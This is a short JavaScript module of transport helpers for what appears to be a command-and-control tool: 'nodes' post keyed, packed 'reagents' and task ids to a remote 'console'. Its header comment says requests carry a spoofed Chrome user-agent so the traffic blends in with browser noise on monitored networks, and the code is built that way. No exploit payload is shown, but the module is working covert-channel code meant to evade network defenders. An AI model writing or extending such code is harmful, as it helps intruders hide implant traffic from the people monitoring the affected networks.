// chloride/wire.mjs — node-side transport helpers
//
// Thin fetch wrappers used by the node runtime. Every body is a
// packed reagent; every request carries a deliberately plain
// user-agent string so console traffic blends with ordinary
// browser-level noise on monitored networks.

import { packReagent, unpackReagent } from "./codec.mjs";

export const DEFAULT_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

export function makeTransport({ base, profileKey, taskId, ua = DEFAULT_UA } = {}) {
  if (!base) throw new Error("wire: base url required");
  if (!profileKey) throw new Error("wire: profile key required");
  if (!taskId) throw new Error("wire: task id required");

  const baseHeaders = {
    "content-type": "application/octet-stream",
    "user-agent": ua,
    "x-chl-task": taskId,
  };

  async function postReagent(path, reagent) {
    const body = packReagent(reagent, profileKey);
    const res = await fetch(`${base}${path}`, {
      method: "POST",
      body,
      headers: baseHeaders,
    });
    if (!res.ok) {
      const errBody = await res.text().catch(() => "");
      throw new Error(`console ${res.status} on ${path}: ${errBody.slice(0, 120)}`);
    }
    const buf = Buffer.from(await res.arrayBuffer());
    return unpackReagent(buf, profileKey);
  }

  async function postRaw(path, buf, headers = {}) {
    const res = await fetch(`${base}${path}`, {
      method: "POST",
      body: buf,
      headers: { ...baseHeaders, ...headers },
    });
    if (!res.ok) throw new Error(`console ${res.status} on ${path}`);
    return res.json();
  }

  return { postReagent, postRaw };
}
